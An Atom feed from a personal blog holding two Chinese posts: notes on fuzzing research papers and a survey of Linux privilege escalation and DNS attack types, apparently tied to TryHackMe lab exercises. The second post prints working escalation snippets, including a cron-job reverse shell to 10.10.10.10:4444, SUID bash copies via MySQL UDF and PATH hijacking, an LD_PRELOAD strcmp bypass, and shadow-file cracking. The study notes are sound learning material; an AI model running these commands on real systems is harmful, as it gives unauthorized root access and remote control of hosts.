<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jingtianer</title>
  
  <subtitle>A cat coder</subtitle>
  <link href="https://jingtianer.github.io/home/atom.xml" rel="self"/>
  
  <link href="https://jingtianer.github.io/home/"/>
  <updated>2023-02-12T13:57:28.074Z</updated>
  <id>https://jingtianer.github.io/home/</id>
  
  <author>
    <name>Meow Meow Liu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DNS第五周文献阅读</title>
    <link href="https://jingtianer.github.io/home/2023/02/12/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E4%BA%94%E5%91%A8%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB/"/>
    <id>https://jingtianer.github.io/home/2023/02/12/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E4%BA%94%E5%91%A8%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB/</id>
    <published>2023-02-12T04:15:37.000Z</published>
    <updated>2023-02-12T13:57:28.074Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Alphuzz-Monte-Carlo-Search-on-Seed-Mutation-Tree-for-Coverage-Guided"><a href="#Alphuzz-Monte-Carlo-Search-on-Seed-Mutation-Tree-for-Coverage-Guided" class="headerlink" title="Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guided"></a>Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guided</h2><h3 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h3><p>在本研究中，我们发现种子之间的关系对于种子调度是有价值的。我们通过研究和利用种子之间的变异关系，设计并提出了一个”种子变异树”。利用”种子变异树”，我们进一步将种子调度问题建模为蒙特卡洛树搜索( MCTS )问题。即在MCTS估计的基础上，通过最优路径遍历”种子变异树”，选择下一个种子进行模糊处理。</p><h3 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h3><p>大量的种子调度策略被提出。一般来说，这些策略的目的是根据一定的标准为每个种子分配一个分数，然后选择分数最高的种子进行下一次的模糊迭代。例如，AFL偏好于具有最小尺寸和最短执行时间的种子。这些策略独立地对待这些种子，并没有明确地考虑种子之间的关系。</p><p>“种子变异树”的主要优点是有利于种子调度在利用式(即,反复锻炼一个高电位的种子和它的邻居)和探索式(即,尝试一个很少锻炼的种子)之间进行平衡，以获得最佳性能。如上所述，种子调度是指为探索其邻居路径而选择一条执行路径。利用种子之间的关系，我们可以进一步将每个种子对应的路径组织为一个树结构，记为执行树。</p><h3 id="论文贡献"><a href="#论文贡献" class="headerlink" title="论文贡献"></a>论文贡献</h3><ul><li>新见解。我们重点观察到种子之间的关系对于种子调度是有价值的。我们研究并利用种子变异关系来构建一个”种子变异树”，它是模糊测试执行树的近似，可以进一步帮助种子调度平衡利用和探索。</li><li>新的fuzzing技术。利用”种子变异树”，我们将种子调度问题建模为蒙特卡洛树搜索( MCTS )问题，并提出了基于MCTS的种子调度策略。由于MCTS算法的性质，该策略在利用和探索之间取得了平衡。</li></ul><h3 id="种子变异树"><a href="#种子变异树" class="headerlink" title="种子变异树"></a>种子变异树</h3><p>种子变异树被定义成一个三元组，T &#x3D; (V, E, 𝛼),V是种子，E是边，𝛼是突变关系</p><ul><li>最初，树由根节点和几个初始种子的节点构成</li><li>选择一个种子变异，生成新的测试用例。然后，将新生成的覆盖新路径的测试用例作为原始种子的子代加入到”种子变异树”中。</li><li>一些特殊的突变可能作用于两个种子。例如，AFL中剪接体的突变会将一个种子与第二个种子进行剪接，产生新的输入。在这种情况下，我们只在新节点和第一个种子对应的节点之间构造一条边，因为第一个种子是通过种子调度策略选择的，而第二个种子是随机选择的。</li></ul><h4 id="三个挑战"><a href="#三个挑战" class="headerlink" title="三个挑战"></a>三个挑战</h4><ul><li>搜索空间大且不断增大。因此，我们需要一个启发式算法来提供当前的最佳决策。</li><li>启发式算法的核心是给种子分配分数。然而，随着模糊测试对其相邻路径的探索越来越深入，种子覆盖路径的得分可能会下降。因此，在每次模糊迭代后更新树上所有种子的得分是必要的，但也是具有挑战性的。</li><li>很难平衡开发和利用。由于模糊测试本质上的随机化特性的影响，经过一次模糊测试迭代后计算出的种子评分会受到这种不确定性的影响。因此，如何在这些不确定因素下平衡开发和利用是一个挑战。</li></ul><h3 id="蒙特卡洛搜索"><a href="#蒙特卡洛搜索" class="headerlink" title="蒙特卡洛搜索"></a>蒙特卡洛搜索</h3><p>MCTS是一种通过基于随机抽样的顺序构建树进行最优决策的算法。该过程包括四个步骤：</p><ul><li>选择。MCTS采用特定的树策略，从根节点R开始，递归地选择最优的子节点，直到达到一个叶节点L。</li><li>扩张。如果L不是终端节点，则MCTS创建一个或多个子节点。进一步，从这些子节点中选择一个节点C。在这一步中，子节点指的是来自L定义的状态的任何有效移动。</li><li>仿真。通过随机选择动作来执行，直到达到一个结果或预定义的状态。</li><li>反向传播。这一步回传从新节点C传播到根节点R，更新仿真结果。</li></ul><p>树的置信上界（UCB）：UCB公式平衡了对已知奖励的利用和对相对未访问节点的探索，以获得最佳性能。</p><h4 id="基于蒙特卡洛的种子调度算法"><a href="#基于蒙特卡洛的种子调度算法" class="headerlink" title="基于蒙特卡洛的种子调度算法"></a>基于蒙特卡洛的种子调度算法</h4><p>MCTS从根节点开始，在每个层次上选择得分最高的下一个节点，直到达到一个叶节点。然后，模糊测试在监视新生成的输入的执行的同时随机变异所选的种子。由于并不是所有新生成的输入都提高了代码覆盖率，因此我们先进行仿真，只在树中添加提高代码覆盖率的输入。最后，我们在每次模糊迭代后更新种子的得分</p><h4 id="树的构建与扩展"><a href="#树的构建与扩展" class="headerlink" title="树的构建与扩展"></a>树的构建与扩展</h4><p>“种子变异树”中，一个内部节点有两种不同的角色。首先，它指的是种子。其次，从树的结构来看，它也是子树的根节点。因此，一个内部节点即使有多个子节点也可以被选为种子。<br>作为种子，分数是指选择该种子的模糊度得分。作为子树的根节点，分数指的是选择子树中每个种子的摘要模糊度得分。</p><p>为了解决这种不相容性，我们通过为每个内部节点插入一个变异节点来更新”种子变异树”。内部节点指其子树的根节点，变体指其对应的种子。这样，变体将是内部节点的一个叶子节点。对于模糊得分，内部节点指子树中每个种子的模糊得分汇总。相比之下，变体是指对应种子的模糊度评分。</p><h2 id="Not-All-Coverage-Measurements-Are-Equal-Fuzzing-by-Coverage-Accounting-for-Input-Prioritization"><a href="#Not-All-Coverage-Measurements-Are-Equal-Fuzzing-by-Coverage-Accounting-for-Input-Prioritization" class="headerlink" title="Not All Coverage Measurements Are Equal: Fuzzing by Coverage Accounting for Input Prioritization"></a>Not All Coverage Measurements Are Equal: Fuzzing by Coverage Accounting for Input Prioritization</h2><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><blockquote><p>论文中提到的，以及我个人需要读懂这篇论文，需要进行补充的背景知识</p></blockquote><h4 id="taint-analysis"><a href="#taint-analysis" class="headerlink" title="taint analysis"></a>taint analysis</h4><p>污点分析可以抽象成一个三元组&lt;sources, sinks, sanitizers&gt;的形式。sources：污点源，代表直接引入不受信任的数据或者机密数据到系统中。sink：污点汇聚点，代表直接产生安全敏感操作或者泄露隐私数据到外界。sanitizer：无害处理，代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害。</p><p>污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点.如果不能,说明系统是信息流安全的;否则,说明系统产生了隐私数据泄露或危险数据操作等安全问题。</p><p>污点分析的处理过程可以分成 3 个阶段: (1) 识别污点源和汇聚点; (2) 污点传播分析; (3) 无害处理.</p><h4 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h4><ul><li><a href="https://www.jianshu.com/p/2ba973c4b0cc/">参考</a></li><li><a href="https://www.baidu.com/s?wd=SymQEMU:Compilation-based%20symbolic%20execution%20for%20binaries">参考论文–SymQEMU:Compilation-based symbolic execution for binaries</a><br>符号执行 （Symbolic Execution）是一种程序分析技术，它可以通过分析程序来得到让特定代码区域执行的输入。顾名思义，使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。<br>在理想模型中，程序使用的每个符号变量均应该是一个有符号整数。</li></ul><p>符号执行技术近年来大力发展，一种有效但是代价大的技术，其经常与fuzzing技术混合，并成为混合fuzzing，fuzzing用来探索容易到达的路径，而符号执行用来探索不易到达的路径。</p><p>针对符号执行技术的重要特征之一就是其是否需要提供源代码进行分析，而真实世界中的大多数程序(由于某些原因)是不提供源代码的。</p><h4 id="白盒测试（structure）"><a href="#白盒测试（structure）" class="headerlink" title="白盒测试（structure）"></a>白盒测试（structure）</h4><p>主要专注于测试系统内部的结构，因此需要尽可能的在测试中覆盖到所有必要的要素。</p><ul><li>statement coverage&#x2F;node coverage: test case要确保尽可能覆盖到所有的node（每一个操作在控制流程图(CFG)中就是一个圆角方框即node）</li><li>decision coverage&#x2F;edge coverage: test case要确保尽可能覆盖到所有的edge，（即所有的箭头）</li><li>condition coverage: 这是针对代码中测试的条件语句，每个条件要尽量cover到其所有正确或错误的结果，主要有两种写test case的方法<ul><li>simple: 针对条件语句中所有的条件，每个条件都需要至少有一个T和一个F的情况包括在内（这个情况称为满足simple condition coverage），但是仅仅是针对一个语句里的子条件，整个条件语句的结果可能不会满足一定有T和F（这种情况为满足condition coverage）。</li><li>multiple: 这种方法就是不仅要满足每个子条件有T有F还要将所有可能的子条件的组合情况给列出来</li></ul></li><li>path coverage: 在test case中需要尽量包括所有的路径（即到每一个可能终点的可能路径），值得注意的是如果没有循环才可能cover到所有的情况，即使只有一个循环也无法cover到所有的情况</li><li>loop coverage: 其实算是path coverage的一部分，其旨在测试代码中的循环。</li></ul><h4 id="anti-fuzzing-techniques"><a href="#anti-fuzzing-techniques" class="headerlink" title="anti-fuzzing techniques"></a>anti-fuzzing techniques</h4><p>反模糊化技术通过插入伪路径、在错误处理代码中添加延迟、模糊代码以减缓动态分析来欺骗模糊测试。</p><h4 id="CGF-Coverage-guided-Fuzzing"><a href="#CGF-Coverage-guided-Fuzzing" class="headerlink" title="CGF(Coverage-guided Fuzzing)"></a>CGF(Coverage-guided Fuzzing)</h4><p>fuzzing是一种自动生成和测试输入以发现软件漏洞的程序测试技术。它不需要对程序的理解，也不需要人工生成测试用例，具有灵活性，容易适用于不同的程序。</p><p>覆盖率引导的模糊测试以一个初始输入(种子)和一个目标程序作为输入，产生触发程序错误的输入作为输出。它重复选择一个输入，用输入运行目标程序，并根据当前输入及其运行结果生成新的输入。</p><h3 id="文章贡献"><a href="#文章贡献" class="headerlink" title="文章贡献"></a>文章贡献</h3><ul><li>提出了coverage accounting，输入优化的新方法</li><li>开发了TortoiseFuzz，基于coverage accounting的灰盒fuzzer</li></ul><h3 id="coverage-accounting"><a href="#coverage-accounting" class="headerlink" title="coverage accounting"></a>coverage accounting</h3><p>对edges度量，进行输入优化，通过对输入进行优先级排序，缩短发现漏洞的时间；为了抵御anti-fuzzing，不依赖于污点分析或者符号执行。</p><p>从函数调用，循环和基本块三个粒度分别对edge进行度量。</p><ul><li>函数调用：从CVE以及其子页面中爬取数据，总结出一些易于出现问题的库函数的数据表。根据这些数据表，计算一个edge目的基本块中调用这些易于出现问题的库函数的函数个数</li><li>循环：若e是back edge（回边，其头是其尾的必经结点），则为1，否则为0</li><li>基本块：目的基本块中包含内存操作的指令个数</li></ul><h3 id="TORTOISEFUZZ的设计"><a href="#TORTOISEFUZZ的设计" class="headerlink" title="TORTOISEFUZZ的设计"></a>TORTOISEFUZZ的设计</h3><p>fuzzer的设计目的是结合coverage accounting，对更容易导致脆弱代码的输入进行优先级排序，同时保证优先输入覆盖足够的代码</p><ul><li>由于内存操作是内存错误的先决条件，所以只有安全敏感的edges才是漏洞的关键，因此应该被选择的输入完全覆盖。</li><li>通过coverage accounting的计算，并设置一个域值，当超过域值时，认为是安全敏感的</li><li>在输入的选择上，输入越是命中安全敏感的edges，越有可能演化为触发漏洞</li></ul><h2 id="可疑基本块导向的定向模糊测试技术研究"><a href="#可疑基本块导向的定向模糊测试技术研究" class="headerlink" title="可疑基本块导向的定向模糊测试技术研究"></a>可疑基本块导向的定向模糊测试技术研究</h2><h3 id="核心内容"><a href="#核心内容" class="headerlink" title="核心内容"></a>核心内容</h3><ul><li>利用静态污点分析筛选出目标程序所有可疑基本块，再通过函数间控制流分析得出基本块之间的可达性，以提取可到达可疑基本块集合的所有基本块<ul><li>这篇文章分析了三种问题：缓冲区溢出、整形溢出、移位位数过大的特征，使用污点分析方法找到这些特征所在的代码块。</li></ul></li><li>将可疑基本块以及可以到达这些块的块作为插桩对象，除此之外，无法到达该可疑基本块的块则不插桩，以此降低桩代码引入的额外开销。</li><li>计算所有基本块到可疑基本块集合的距离，根据该距离赋予基本块权重，距离越小权重越大</li><li>根据种子所触发路径上各基本块的权重计算其变异后漏洞发现概率，变异时优先选择漏洞发现概率更高的种子，借此优化种子选择过程，提高模糊测试漏洞挖掘效率。</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Alphuzz-Monte-Carlo-Search-on-Seed-Mutation-Tree-for-Coverage-Guided&quot;&gt;&lt;a href=&quot;#Alphuzz-Monte-Carlo-Search-on-Seed-Mutation-Tree-for-Coverage-Guided&quot; class=&quot;headerlink&quot; title=&quot;Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guided&quot;&gt;&lt;/a&gt;Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guided&lt;/h2&gt;&lt;h3 id=&quot;abstract&quot;&gt;&lt;a href=&quot;#abstract&quot; class=&quot;headerlink&quot; title=&quot;abstract&quot;&gt;&lt;/a&gt;abstract&lt;/h3&gt;&lt;p&gt;在本研究中，我们发现种子之间的关系对于种子调度是有价值的。我们通过研究和利用种子之间的变异关系，设计并提出了一个”种子变异树”。利用”种子变异树”，我们进一步将种子调度问题建模为蒙特卡洛树搜索( MCTS )问题。即在MCTS估计的基础上，通过最优路径遍历”种子变异树”，选择下一个种子进行模糊处理。&lt;/p&gt;
&lt;h3 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#introduction&quot; class=&quot;headerlink&quot; title=&quot;introduction&quot;&gt;&lt;/a&gt;introduction&lt;/h3&gt;&lt;p&gt;大量的种子调度策略被提出。一般来说，这些策略的目的是根据一定的标准为每个种子分配一个分数，然后选择分数最高的种子进行下一次的模糊迭代。例如，AFL偏好于具有最小尺寸和最短执行时间的种子。这些策略独立地对待这些种子，并没有明确地考虑种子之间的关系。&lt;/p&gt;
&lt;p&gt;“种子变异树”的主要优点是有利于种子调度在利用式(即,反复锻炼一个高电位的种子和它的邻居)和探索式(即,尝试一个很少锻炼的种子)之间进行平衡，以获得最佳性能。如上所述，种子调度是指为探索其邻居路径而选择一条执行路径。利用种子之间的关系，我们可以进一步将每个种子对应的路径组织为一个树结构，记为执行树。&lt;/p&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="文献阅读" scheme="https://jingtianer.github.io/home/tags/%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>DNS第四周调研</title>
    <link href="https://jingtianer.github.io/home/2023/02/02/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%B0%83%E7%A0%94/"/>
    <id>https://jingtianer.github.io/home/2023/02/02/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%B0%83%E7%A0%94/</id>
    <published>2023-02-02T04:15:37.000Z</published>
    <updated>2023-02-12T03:09:54.318Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主机提权"><a href="#主机提权" class="headerlink" title="主机提权"></a>主机提权</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/432182767">参考</a></li><li><a href="https://zhuanlan.zhihu.com/p/304572787">蓝桥杯教程</a></li><li><a href="https://tryhackme.com/room/linuxprivesc">tryHackme</a>，这是一个靶场，提供了21个主机提权的task</li></ul><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><ol><li><p>UDF全名user-defined function capability</p></li><li><p>它可以通过对MYSQL中的函数调用连接系统上可用的系统动态库</p></li></ol><h4 id="UDF攻击条件"><a href="#UDF攻击条件" class="headerlink" title="UDF攻击条件"></a>UDF攻击条件</h4><ol><li>必须获得MYSQL的账号最好是root，然后去到MYSQL里面检查是否拥有insert插入权限，检查命令: <code>select User,Host from user where Insert_priv=&#39;Y&#39;;</code>是否有输出</li><li>可以更改数据库当然拿到root最好</li><li>允许拷贝文件进来(检查命令: <code>show variables like &#39;local_infile&#39;;</code>结果为ON才行)</li></ol><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ol><li>首先攻进去并且获得一个MYSQL数据库账号且权限比较高</li><li>上传一个恶意的动态库文件</li><li>在进入MYSQL以后通过insert函数把动态库文件存储进来</li><li>搭建连接</li><li>执行</li><li>复现过程,首先需要准备好文件，kali上已有(raptor_udf2.so)</li><li>创建do_system函数</li><li>执行函数 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> do_system(<span class="string">&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li>启动这个bash</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootbash -p</span><br></pre></td></tr></table></figure><h3 id="可读的-x2F-etc-x2F-shadow文件"><a href="#可读的-x2F-etc-x2F-shadow文件" class="headerlink" title="可读的&#x2F;etc&#x2F;shadow文件"></a>可读的&#x2F;etc&#x2F;shadow文件</h3><p><code>/etc/shadow</code>和<code>/etc/passwd</code>上面都会存储着这台机子上的用户密码信息。<code>passwd</code>可读但不会显示具体密码，理论上来讲只有<code>root</code>才能改。而<code>shadow</code>有加密的账号密码信息但是一般来讲是不可读的。这里假设我们拥有对<code>/etc/shadow</code>的读写权限。</p><p>保存成文本信息，可用<code>john</code>进行解密。最后得到密码。</p><h3 id="可写的-x2F-etc-x2F-shadow文件"><a href="#可写的-x2F-etc-x2F-shadow文件" class="headerlink" title="可写的&#x2F;etc&#x2F;shadow文件"></a>可写的&#x2F;etc&#x2F;shadow文件</h3><p>通过<code>john</code>获取<code>/etc/shadow</code>的加密方法，使用相同的加密方法将密码替换</p><h3 id="可写的-x2F-etc-x2F-passwd文件"><a href="#可写的-x2F-etc-x2F-passwd文件" class="headerlink" title="可写的&#x2F;etc&#x2F;passwd文件"></a>可写的&#x2F;etc&#x2F;passwd文件</h3><p>使用以下命令生成加密后的密码，修改<code>/etc/passwd</code>中root的密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd 123456</span><br></pre></td></tr></table></figure><h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><ul><li><a href="https://www.cnblogs.com/vir-k/p/16301456.html">sudo提权参考</a></li></ul><p>在Linux&#x2F;Unix中，<code>/etc/sudoers</code>文件是<code>sudo</code>权限的配置文件，其中储存了一些用户或组可以以<code>root</code>权限使用的命令。通过<code>sudo -l</code>可以查看用户能以root权限运行的命令</p><p>可以利用sudo提权的命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp、ed、screen</span><br></pre></td></tr></table></figure><p>在<code>/etc/sudoers</code>中需要有以下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/awk</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/vim</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/man</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/apache2</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/less</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /bin/more</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/find</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/zip</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure><p><code>hacker</code>用户可以以<code>root</code>身份运行<code>awk</code>, <code>vim</code> 等命令即可</p><h4 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>每个命令具体的攻击流程在上面的<a href="#sudo%E6%8F%90%E6%9D%83">参考</a>中有写</p><h3 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h3><p><code>LD_LIBRARY_PATH</code> : 提供首先会在某些动态库里面列出会使用到哪些动态库</p><p><code>LD_PRELOAD</code> : 在某个程序运行前先加载一个对象</p><h4 id="一个preload-c的例子"><a href="#一个preload-c的例子" class="headerlink" title="一个preload.c的例子"></a>一个preload.c的例子</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 文件名：preload.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n&quot;</span>, s1, s2);</span><br><span class="line">        <span class="comment">/* 永远返回0，表示两个字符串相等 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果登录验证时使用了strcmp函数比较输入字符串和密码是否相同，替换该函数，使得strcmp永远返回0。</p><h3 id="cron-job提权"><a href="#cron-job提权" class="headerlink" title="cron job提权"></a>cron job提权</h3><p>假设root会定期使用<code>cron</code>执行<code>overwrite.sh</code>这个脚本，找到这个脚本发现该脚本是可编辑的，将该脚本的替换成以下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>创建一个交互式的bash，并将输入输出重定向到 <code>/dev/tcp/10.10.10.10/4444</code> socket连接上。</p><h3 id="cron-环境变量提权"><a href="#cron-环境变量提权" class="headerlink" title="cron 环境变量提权"></a>cron 环境变量提权</h3><p>在<code>/etc/crontab</code>中显示的环境变量<code>$PATH</code>是从<code>/home/user</code>找起，而root执行的<code>overwrite.sh</code>在<code>usr/local/bin</code>中，可以在<code>/home/user</code>下写入一个<code>overwrite.sh</code>文件来提权</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/rootBash</span><br><span class="line"><span class="built_in">chmod</span> +xs /tmp/rootBash</span><br></pre></td></tr></table></figure><h3 id="查看历史寻找敏感信息"><a href="#查看历史寻找敏感信息" class="headerlink" title="查看历史寻找敏感信息"></a>查看历史寻找敏感信息</h3><p>查看输入命令的历史，看其中是否有密码、敏感信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.*<span class="built_in">history</span></span><br></pre></td></tr></table></figure><h3 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h3><p>在NFS中，如果配置了<code>root_squash</code>，当使用root用户登录访问时，会将root用户转换成匿名用户。此时他的<code>uid</code>和<code>gid</code>都会变成<code>nobody</code>账号的身份。如果配置了<code>no_root_squash</code>，则会以<code>root</code>身份直接访问。</p><p>此时在nfs中创建文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setpid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash/&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对他进行编译，等待编译后的文件同步到靶机上，进行执行，即可提权</p><h3 id="Capability提权"><a href="#Capability提权" class="headerlink" title="Capability提权"></a>Capability提权</h3><p>从2.1版本以后Linux开始引入capability让普通用户也可干root可做的事。capability可让某个程序拥有超能力而sudo只是针对某个用户&#x2F;文件赋予它SUID(超能力)。</p><p>使用该命令可以找到具有<code>cap_setuid</code>能力的程序，具体提权方法可以查找<a href="https://gtfobins.github.io/"><code>gtfobin</code></a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p><code>dirtycow</code>可以对内核版本2.6左右的系统进行提权，可以借助<code>linux-exploit-suggester</code>等工具查询提权方法。</p><h3 id="提权相关漏洞"><a href="#提权相关漏洞" class="headerlink" title="提权相关漏洞"></a>提权相关漏洞</h3><ul><li>CVE-2019-19495，web页面设计问题导致页面收到DNS rebinding攻击，使外部能够访问root shell</li><li>CVE-2019-12511，通过向”NETGEAR Genie” SOAP 端点发送特制的MAC地址，就可以以root用户身份执行任意系统命令</li><li>CVE-2000-1029，CVE-2002-0029，CVE-2002-0684，Buffer overflow导致攻击方可以以root身份执行任意命令</li><li>CVE-2001-0013，字符串格式化问题导致攻击者获取riit权限</li><li><a href="https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64">ISC » Bind : Vulnerability Statistics</a>显示了历年找到的bind中的各类bug</li></ul><h2 id="域名解析服务扰乱-三类"><a href="#域名解析服务扰乱-三类" class="headerlink" title="域名解析服务扰乱 (三类)"></a>域名解析服务扰乱 (三类)</h2><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzUzNDYxOTA1NA==&mid=2247530965&idx=1&sn=5c35152b5545c2716af43b85144acab4&chksm=fa93cf14cde44602f937581f78af1a3c9b9c08acec40383e9c00722d343a1b67ad388a3986ac&scene=27">参考1–简析DNS攻击的常见类型、危害与防护建议</a></li><li><a href="https://heimdalsecurity.com/blog/anatomy-of-a-dns-attack/">参考2–On the Anatomy of a DNS Attack – Types, Technical Capabilities, and Mitigation</a></li><li><a href="https://www.itu.int/en/ITU-D/Regional-Presence/Americas/Documents/EVENTS/2016/15551-EC/2A.pdf">参考3–Attacks Against The DNS</a></li></ul><h3 id="拒绝服务-DoS-类攻击"><a href="#拒绝服务-DoS-类攻击" class="headerlink" title="拒绝服务(DoS)类攻击"></a>拒绝服务(DoS)类攻击</h3><p>通过耗尽机器或网络的资源将其服务关闭，阻止用户访问机器或网络。需要强调的是，这种攻击的目的主要用于隐藏踪迹或阻碍受害者恢复工作。</p><h4 id="DNS放大"><a href="#DNS放大" class="headerlink" title="DNS放大"></a>DNS放大</h4><ul><li>Reflection Attack</li><li>Reflection Attack And Amplification Attack</li><li>Distributed Reflection And Amplification Attack</li></ul><p>DNS放大是DoS攻击中用于利用域名系统并加大目标网站流量的一种技术。这种攻击方法利用的主要技术包括DNS反射和地址伪造。不法分子实施这种攻击的手法是，向域名系统服务器发送伪造的IP数据包，请求目标的域名，使用目标的IP地址代替自己的IP地址。</p><p>所有这些查询都由DNS服务器用目标机器的IP地址来答复。然后，受害者的服务器向每个请求发送相同的答复。这导致庞大的数据流量从受害者网络的端口80或25流入。</p><blockquote><p>伪造DNS请求，并替换请求中的源地址替换成攻击对象(target)的地址，称为<code>Reflection Attack</code>，如果在此基础上向DNS发送大量的请求，使target<code>80/25</code>端口接收过多攻击，称为<code>Reflection Attack And Amplification Attack</code>，如果多个Attacker对DNS发起此类虚假的请求，称为<code>Distributed Reflection And Amplification Attack</code></p></blockquote><h4 id="SYN-Flood-Resource-Depletion-DOS-Attack"><a href="#SYN-Flood-Resource-Depletion-DOS-Attack" class="headerlink" title="SYN Flood 